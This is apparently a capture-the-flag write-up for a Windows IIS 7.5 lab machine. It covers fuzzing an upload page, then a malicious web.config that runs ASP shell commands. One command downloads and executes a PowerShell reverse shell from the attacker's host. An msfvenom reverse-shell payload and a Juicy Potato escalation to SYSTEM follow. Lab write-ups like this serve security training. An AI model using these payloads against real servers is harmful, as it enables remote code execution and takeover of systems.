- Only port 80 is open with an IIS server.
- The IIS Server version (7.5) is very old, suggesting potential exploits might exist.
- The machine is likely running Windows based on the service information.

# Enumeration

- I performed directory discovery using `ffuf` and found a directory called `uploadedfiles` but encountered a 403 Access Denied error. This prompted me to search for bypass techniques.

bash

```bash
ffuf -u http://10.10.10.93/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 150
```

![Pasted image 20250518151418.png](images/Pasted_image_20250518151418.png)

- I discovered that there's an exploit for older versions of IIS that might help bypass access restrictions.

Title: Microsoft IIS 7.5 Classic ASP Authentication Bypass

Affected Software:
Microsoft IIS 7.5 with configured Classic ASP and .NET Framework 4.0
installed (.NET Framework 2.0 is unaffected, other .NET frameworks
have not been tested)
(tested on Windows 7)

Details:
By appending ":$i30:$INDEX_ALLOCATION" to the directory serving the
classic ASP file access restrictions can be successfully bypassed.

Take this Example:
1.) Microsoft IIS 7.5 has Classic ASP configured (it allows serving .asp files)
2.) There is a password protected directory configured that has
administrative asp scripts inside
3.) An attacker requests the directory with :$i30:$INDEX_ALLOCATION
appended to the directory name
4.) IIS/7.5 gracefully executes the ASP script without asking for
proper credentials
```

- According to the exploit documentation, I needed to append `:$i30:$INDEX_ALLOCATION` to the URL, like this:

```
http://10.10.10.93/uploadedfiles:$i30:$INDEX_ALLOCATION
```

- I tried to exploit this, but it failed because the prerequisite "password protected directory with administrative asp scripts" wasn't present in our target.
- After attempting several other exploits without success, I checked for HTTP version vulnerabilities like MS15-034 (CVE-2015-1635).

bash

```bash
python CVE-2015-1635-POC.py -t 10.10.10.93
```

![Pasted image 20250518154217.png](images/Pasted_image_20250518154217.png)

- Surprise! This whole path turned out to be a rabbit hole! üê∞
- I had been following a writeup that went down this same unfruitful path, and I confidently followed along. üòó
- My Reaction is Like,

![shock-shocker.gif](images/shock-shocker.gif)

- The actual vulnerability was much simpler - there's an ASPX page called `transfer.aspx` that allows file uploads.
- Unfortunately, my directory discovery tools missed this file despite trying different wordlists and techniques. üòí

![Pasted image 20250518155952.png](images/Pasted_image_20250518155952.png)

## Solution Explanation

- After watching the legendary ippsec's video on this box ([https://www.youtube.com/watch?v=7ur4om1K98Y](https://www.youtube.com/watch?v=7ur4om1K98Y)), I tried running gobuster with a different wordlist:
- `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
- This time, I successfully found `transfer.aspx`.
- When I tried to upload a text file, it returned "invalid file":

![Pasted image 20250518165401.png](images/Pasted_image_20250518165401.png)

- This meant I needed to discover which file extensions were permitted. While Burp Suite's Intruder could be used, it would be painfully slow for this task, so I opted for `ffuf` instead.
- The command for extension bruteforcing:

bash

```bash
ffuf -request fuzz.req -w /mnt/hgfs/SecLists-master/Discovery/Web-Content/raft-small-extensions.txt -request-proto http
```

- Here's the request file used (fuzz.req):

r

```r

```

- By analyzing the response sizes, I was able to filter out these three interesting file extensions:

![Pasted image 20250518171122.png](images/Pasted_image_20250518171122.png)

r

```r
.config <== (Most promising)
.jpeg
.doc
```

- Success! The file with .config extension was uploaded:

# Exploitation

- For this exploitation technique, I first tested with a simple ICMP callback using ping to verify command execution.
- Here's the malicious web.config file:


```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c ping 10.10.16.10")
o = cmd.StdOut.ReadAll()
Response.Write(o)
%>
-->
```

- How this works:
    - The config file reconfigures the IIS server to process .config files using ASP
    - The ASP code embedded in HTML comments executes system commands
    - The server processes this file and runs our commands with the server's privileges

![Pasted image 20250518174605.png](images/Pasted_image_20250518174605.png) ![Pasted image 20250518174553.png](images/Pasted_image_20250518174553.png) ![Pasted image 20250518174619.png](images/Pasted_image_20250518174619.png)

- For a proper reverse shell, I used [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) with an added command at the end:

powershell

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.10 -Port 1337
```

- Modified web.config to download and execute the PowerShell script:



```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.10/Invoke-PowerShellTcp.ps1')")
o = cmd.StdOut.ReadAll()
Response.Write(o)
%>
-->
```

- After uploading the file and accessing it, I successfully received a shell connection!

# Post Exploitation

- After checking permissions with `whoami /priv`, I discovered that `SeImpersonatePrivilege` was enabled. This is perfect for using the [Juicy Potato](https://github.com/ohpe/juicy-potato) privilege escalation technique.

![Pasted image 20250519212835.png](images/Pasted_image_20250519212835.png)

## What is SeImpersonatePrivilege?

- `SeImpersonatePrivilege` allows a process to impersonate the security context of another user.
- It's normally used by services to impersonate clients (e.g., when a web server impersonates a logged-in user).
- If you can **coerce** a privileged token (e.g., SYSTEM) to authenticate to your service and you can **impersonate it**, you can escalate to SYSTEM privileges.
- This privilege is a common path to privilege escalation on Windows servers.

## Gaining SYSTEM Shell with Juicy Potato

- First, I uploaded the Juicy Potato executable as jp.exe:

![Pasted image 20250519213514.png](images/Pasted_image_20250519213514.png)

- Next, I generated a reverse shell payload using msfvenom:


```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe -o reverse.exe
```

- Then uploaded this reverse shell executable:

![Pasted image 20250519213413.png](images/Pasted_image_20250519213413.png)

- Finally, I executed Juicy Potato with the following command to trigger my reverse shell as NT AUTHORITY\SYSTEM:


```bash
jp.exe -l 1337 -t * -p reverse.exe
```

- How Juicy Potato works:
    - It abuses the SeImpersonatePrivilege to create a COM server and forces Windows to authenticate to it
    - It then captures and impersonates that high-privilege token
    - Finally, it launches our payload with those elevated privileges

![Pasted image 20250519213829.png](images/Pasted_image_20250519213829.png)

- Success! I obtained the root flag:
